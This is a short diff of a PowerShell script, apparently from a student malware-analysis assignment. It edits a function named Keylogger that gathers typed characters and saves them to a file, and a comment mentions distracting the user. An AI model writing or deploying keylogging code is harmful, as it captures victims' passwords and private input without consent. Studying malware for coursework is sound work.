@@ -24,8 +24,8 @@ function Keylogger {
         #Add to the string
         $keysnoted.Add($key.keychar)
     }
-    #Will need to write to a new file created instead to store and try and hide more
-    New-Item -ItemType File -Path "C:\Users\maazr\Desktop\Malware-Samples-IBM\Assignment\CO3410Assignment1\copiedkeys.txt" -Value $($keysnoted -join '')
+    #Need to check where the file is being sent
+    New-Item -ItemType File -Path "C:\Users\maazr\Desktop\Malware-Samples-IBM\Assignment\CO3410Assignment1\copiedkeys[10].txt" -Value $($keysnoted -join '')
 }
 
 #Just used to distract the user
